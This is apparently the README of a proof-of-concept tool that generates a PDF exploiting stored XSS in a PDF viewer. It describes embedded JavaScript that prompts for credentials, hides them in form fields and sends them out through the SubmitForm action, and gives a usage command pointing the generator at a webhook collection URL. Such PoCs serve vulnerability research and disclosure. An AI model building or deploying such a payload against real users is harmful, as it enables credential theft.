# PDF-XSS PoC (credential theft via PDF form submission)

A minimal proof-of-concept showing stored XSS in a PDF viewer, where an uploaded PDF executes JavaScript, prompts for credentials, stores them in hidden form fields, and exfiltrates them via the PDF's native `SubmitForm` action.

## Usage

```bash
python3 gen_pdf.py "https://webhook.site/your-id" poc.pdf
```

## Files

- `gen_pdf.py` — the generator (takes the webhook URL as the first argument).
